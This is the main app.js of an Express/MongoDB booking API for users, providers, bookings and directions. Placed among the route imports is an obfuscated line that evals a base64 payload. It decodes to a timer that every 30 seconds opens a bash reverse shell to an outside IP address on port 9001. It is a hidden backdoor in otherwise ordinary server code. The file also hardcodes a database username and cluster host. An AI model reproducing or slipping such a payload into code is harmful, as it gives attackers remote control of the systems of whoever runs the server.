const express = require("express");
const app = express();
const bodyParser = require("body-parser"); //Library that facilitates handling JSON data from requests
const morgan = require("morgan"); //HTTP request logger
const mongoose = require("mongoose"); //Library to manage and connect to MongoDB
require("dotenv").config({ path: "./env" });

mongoose.connect(
  "mongodb+srv://sfaraj:" +
    process.env.MONGO_ATLAS_PW +
    "@serviweb.hm9tpkx.mongodb.net/?retryWrites=true&w=majority&appName=ServiWeb"
);

//Body parser is a module that facilitates handling json data in the request
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

//User Routes
const userRoutes = require("./api/routes/users");
const indProvider = require("./api/routes/indproviders");
const bookingRoutes = require("./api/routes/bookings");
const directionsRouter = require("./api/routes/directions");
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

app.use(morgan("dev")); //Start Logging

//This response provides the headers we need to prevent CORS errors and then say what HTTP methods supported in the API
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, Authorization"
  );

  if (req.method === "OPTIONS") {
    res.header("Access-Control-Allow-Methods", "PUT, POST, PATCH, DELETE, GET");
    return res.status(200).json({});
  }

  next();
});

app.use("/users", userRoutes);
app.use("/indproviders", indProvider);
app.use("/bookings", bookingRoutes);
app.use("/directions", directionsRouter);

//Error Handling

//If a user is trying to access a route that doesn't exist, then this is thrown
app.use((req, res, next) => {
  const error = new Error("The page you are trying to reach does not exist"); //Error object is default from Node
  error.status = 404;
  next(error); //This will forward the error request to the next set of app.use
});

//This is activated if any error is thrown
app.use((error, req, res, next) => {
  res.status(error.status || 500);
  res.json({
    error: {
      message: error.message,
    },
  });
});

module.exports = app;
